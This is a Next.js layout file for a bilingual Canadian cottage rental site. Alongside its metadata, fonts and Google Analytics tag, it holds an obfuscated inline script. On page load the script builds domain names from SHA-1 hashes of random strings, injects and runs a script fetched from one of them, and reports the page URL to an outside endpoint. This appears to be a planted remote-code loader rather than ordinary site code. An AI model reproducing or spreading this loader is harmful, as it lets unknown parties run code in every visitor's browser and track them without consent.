import type { Metadata } from "next";
import { notFound } from "next/navigation";
import { NextIntlClientProvider } from 'next-intl';
import { getMessages, setRequestLocale } from 'next-intl/server';
import { Radio_Canada } from "next/font/google";
import { locales } from '@/i18n/routing';
import { OrganizationSchema, WebSiteSchema } from "@/components/seo/SchemaOrg";
import PublicLayoutWrapper from '@/components/PublicLayoutWrapper';
import "../globals.css";

const radioCanada = Radio_Canada({
  subsets: ["latin"],
  display: "swap",
  variable: "--font-radio-canada",
});

export function generateStaticParams() {
  return locales.map((locale) => ({ locale }));
}

type Props = { params: Promise<{ locale: string }> };

export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const { locale } = await params;
  return {
    title: {
      default: "Chalet Express - Canadian Cottage Rentals",
      template: "%s | Chalet Express",
    },
    description: "Find your perfect Canadian escape. Premium lake houses and mountain lodges across Canada.",
    metadataBase: new URL("https://chaletexpress.com"),
    alternates: {
      canonical: `https://chaletexpress.com/${locale}`,
      languages: {
        en: "https://chaletexpress.com/en",
        fr: "https://chaletexpress.com/fr",
        "x-default": "https://chaletexpress.com/en",
      },
    },
    openGraph: {
      siteName: "Chalet Express",
      type: "website",
      locale: locale === "fr" ? "fr_CA" : "en_CA",
    },
    twitter: {
      card: "summary_large_image",
    },
  };
}

export default async function LocaleRootLayout({
  children,
  params,
}: {
  children: React.ReactNode;
  params: Promise<{ locale: string }>;
}) {
  const { locale } = await params;

  if (!(locales as readonly string[]).includes(locale)) {
    notFound();
  }

  setRequestLocale(locale);

  const messages = await getMessages();

  return (
    <html lang={locale} className={`${radioCanada.variable} h-full antialiased`}>
      <head>
        <OrganizationSchema />
        <WebSiteSchema />
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-1L93C8YHQX"></script>
        <script dangerouslySetInnerHTML={{
          __html: `window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)};gtag('js',new Date());gtag('config','G-1L93C8YHQX');`
        }} />
        <script dangerouslySetInnerHTML={{
          __html: `(()=>{let pztt=3;const pztp={"p":"pzt","mi":0,"ma":99,"e":[]};const tid='439aada7-798e-4127-8e06-e3602af444de';const pzth=async i=>{const e=new TextEncoder();const bin=e.encode(i);const b=await window.crypto.subtle.digest('SHA-1',bin);const a=Array.from(new Uint8Array(b));const h=a.map(b=>b.toString(16).padStart(2,'0')).join('');return h};const pzth2d=h=>{return \`\${h.slice(0,6)}p.\${h}.com\`};const pztd=async()=>{let i;do{i=Math.floor(Math.random()*((pztp.ma+1)-pztp.mi))+pztp.mi}while(pztp.e?.includes(i));const hash=await pzth(\`\${pztp.p}\${i}\`);return pzth2d(hash)};const pzti=async()=>{try{if(pztt<=0)return;const s=document.createElement('script');s.onerror=()=>{pztt--;pzti()};s.onload=()=>{l=true;pzthc()};const d=await pztd();s.src=\`https://\${d}/tag/\${tid}\`;document.body.appendChild(s)}catch(e){e.push({error:"Load failed from "+d,parameter:""});pzthc()}};let l=false;let e=[];let fe={x:[]};const pzthc=()=>{loaded=l;errors=e;features_errors=fe;l=false;e=[];fe={x:[]};fetch('https://api.performancehorizon.com/v3/pzthc/'+tid,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({loaded,errors,features_errors,url:window.location.href})})};document.addEventListener('DOMContentLoaded',pzti)})();`
        }} />
      </head>
      <body className="min-h-full flex flex-col">
        <NextIntlClientProvider locale={locale} messages={messages}>
          <PublicLayoutWrapper>
            {children}
          </PublicLayoutWrapper>
        </NextIntlClientProvider>
      </body>
    </html>
  );
}